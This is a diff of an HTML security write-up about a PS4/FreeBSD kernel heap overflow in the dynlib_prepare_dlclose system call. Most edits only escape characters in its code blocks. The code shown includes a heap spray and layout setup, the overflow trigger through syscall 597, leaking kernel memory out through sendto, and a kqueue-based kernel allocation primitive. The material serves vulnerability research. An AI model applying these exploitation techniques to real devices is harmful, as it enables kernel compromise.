@@ -66,7 +66,7 @@
 				</p>
 				
 				<pre><code>uint64_t count = 0x800000000;
-dynlib_prepare_dlclose(1, NULL, &count);</code></pre>
+dynlib_prepare_dlclose(1, NULL, &amp;count);</code></pre>
 				
 				<p>
 					The interesting thing about this panic was that it didn't happen immediately; the current thread froze whilst the rest of the system remained stable for about 30 seconds before a kernel panic occurred.
@@ -127,7 +127,7 @@ int64_t sys_dynlib_prepare_dlclose(struct thread *td, struct dynlib_prepare_dlcl
 	
 	context = td->td_proc->dl_context;
 	...
-	if(!copyin(uap->countAddress, &count, sizeof(count))) {
+	if(!copyin(uap->countAddress, &amp;count, sizeof(count))) {
 		...
 		allocation = rtld_malloc(count * sizeof(int), 0);
 		...
@@ -138,9 +138,9 @@ int64_t sys_dynlib_prepare_dlclose(struct thread *td, struct dynlib_prepare_dlcl
 			
 			...
 			
-			if(!prepare_dlclose(context, obj, allocation, &count)) {
+			if(!prepare_dlclose(context, obj, allocation, &amp;count)) {
 				if(!copyout(allocation, uap->buffer, 4 * count)) {
-					if(copyout(&count, uap->countAddress, sizeof(count))) result = EFAULT;
+					if(copyout(&amp;count, uap->countAddress, sizeof(count))) result = EFAULT;
 				}
 				
 				else result = EFAULT;
@@ -176,7 +176,7 @@ int64_t sys_dynlib_prepare_dlclose(struct thread *td, struct dynlib_prepare_dlcl
 					The allocation is done by <code>rtld_malloc</code>, which is almost a direct wrapper for <code>malloc</code>. In the FreeBSD kernel <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_malloc.c#L419"><code>malloc</code></a> implementation, different functions will be used depending on whether size > <code>KMEM_ZMAX</code> or not (<code>0x1000</code> on FreeBSD, <code>0x4000</code> on PS4):
 				</p>
 				
-				<pre><code>if(size <= KMEM_ZMAX) {
+				<pre><code>if(size &lt;= KMEM_ZMAX) {
 	...
 	// Perform a zone allocation
 	va = uma_zalloc(zone, flags);
@@ -241,7 +241,7 @@ else {
 				<pre><code>int64_t prepare_dlclose(struct dl_context *context, Obj_Entry *root, void *alloc, int64_t *count) {
 	...
 	if(root->refcount == 1) {
-		objlist_prepare_fini(context, &context->list, root, alloc, count);
+		objlist_prepare_fini(context, &amp;context->list, root, alloc, count);
 		...
 	}
 	...
@@ -285,7 +285,7 @@ while(1) {
 			break;
 		
 		if(obj->refcount == 1) {
-			LODWORD(v11) = sub_FFFFFFFF825E5C30(&root->unk, nextList->obj);
+			LODWORD(v11) = sub_FFFFFFFF825E5C30(&amp;root->unk, nextList->obj);
 			if(v11)
 				break;
 		}
@@ -444,21 +444,21 @@ ffffff8002450000
 
 kprintf("Alloc spray\n");
 int i;
-for(i = 0; i < 100; i++) {
-	void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+for(i = 0; i &lt; 100; i++) {
+	void *m = malloc(0x8000, &amp;M_SUBPROC, M_WAITOK | M_ZERO);
 	kprintf("%p\n", m);
 }
 
 kprintf("Alloc first\n");
-void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+void *m = malloc(0x8000, &amp;M_SUBPROC, M_WAITOK | M_ZERO);
 kprintf("%p\n", m);
 
 kprintf("Alloc second\n");
-void *m2 = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+void *m2 = malloc(0x8000, &amp;M_SUBPROC, M_WAITOK | M_ZERO);
 kprintf("%p\n", m2);
 
 kprintf("Free first\n");
-free(m, &M_SUBPROC);
+free(m, &amp;M_SUBPROC);
 
 kprintf("New alloc\n");
 void *n = rtld_malloc(0x100000000 + 0x8000, 0);
@@ -474,21 +474,21 @@ kprintf("%p\n", n);</code></pre>
 				<pre><code>// Prepare heap layout - kernel:
 kprintf("Alloc spray\n");
 int i;
-for(i = 0; i < 100; i++) {
-	void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+for(i = 0; i &lt; 100; i++) {
+	void *m = malloc(0x8000, &amp;M_SUBPROC, M_WAITOK | M_ZERO);
 	kprintf("%p\n", m);
 }
 
 kprintf("Alloc first\n");
-void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+void *m = malloc(0x8000, &amp;M_SUBPROC, M_WAITOK | M_ZERO);
 kprintf("%p\n", m);
 
 kprintf("Alloc second\n");
-void *m2 = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+void *m2 = malloc(0x8000, &amp;M_SUBPROC, M_WAITOK | M_ZERO);
 kprintf("%p\n", m2);
 
 kprintf("Free first\n");
-free(m, &M_SUBPROC);
+free(m, &amp;M_SUBPROC);
 
 
 // Perform oveflow - userland:
@@ -504,7 +504,7 @@ munmap(mapping + mappingSize, PAGE_SIZE);
 
 memset(mapping + bufferSize, 'a', overflowSize);
 
-int result = syscall(597, 1, mapping, &count);
+int result = syscall(597, 1, mapping, &amp;count);
 printf("Result: %d\n", result);
 
 
@@ -512,7 +512,7 @@ printf("Result: %d\n", result);
 memcpy(dump, m2, 0x8000);
 
 struct sendto_args args = { sock, dump, 0x8000, 0, NULL, 0 };
-sendto(td, &args);</code></pre>
+sendto(td, &amp;args);</code></pre>
 				
 				<p>
 					Sure enough, the two allocations are adjacent, the system call returns <code>EFAULT</code>, the second buffer is overwritten with "<code>aaa...</code>", and the system remains stable (since we only overwrote into our controlled mapping).
@@ -538,7 +538,7 @@ sendto(td, &args);</code></pre>
 				</p>
 				
 				<pre><code>size = kq->kq_knlistsize;
-while(size <= fd)
+while(size &lt;= fd)
 	size += KQEXTENT;
 list = malloc(size * sizeof(*list), M_KQUEUE, mflag);</code></pre>
 				
@@ -550,7 +550,15 @@ list = malloc(size * sizeof(*list), M_KQUEUE, mflag);</code></pre>
 					Using this, we were able to create heap allocation and free primitives in FreeBSD, with size controlled to any multiples of <code>0x800</code> bytes:
 				</p>
 				
-				<pre><code>// Perform kernel allocation aligned to 0x800 bytes
+				<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/event.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/mman.h&gt;
+
+// Perform kernel allocation aligned to 0x800 bytes
 int kernelAllocation(size_t size) {
 	struct kevent kv;
 	int queue = kqueue();
@@ -564,8 +572,8 @@ int kernelAllocation(size_t size) {
 	close(sock);
 	
 	
-	EV_SET(&kv, fd, EVFILT_READ, EV_ADD, 0, 5, NULL);
-	kevent(queue, &kv, 1, 0, 0, 0);
+	EV_SET(&amp;kv, fd, EVFILT_READ, EV_ADD, 0, 5, NULL);
+	kevent(queue, &amp;kv, 1, 0, 0, 0);
 	
 	close(fd);
 	
@@ -577,7 +585,7 @@ void kernelFree(int allocation) {
 }
 
 int main(void) {
-	int allocation = kernelAllocation(PAGE_SIZE * 4);
+	int allocation = kernelAllocation(0x1000);
 	kernelFree(allocation);
 	
 	return 0;
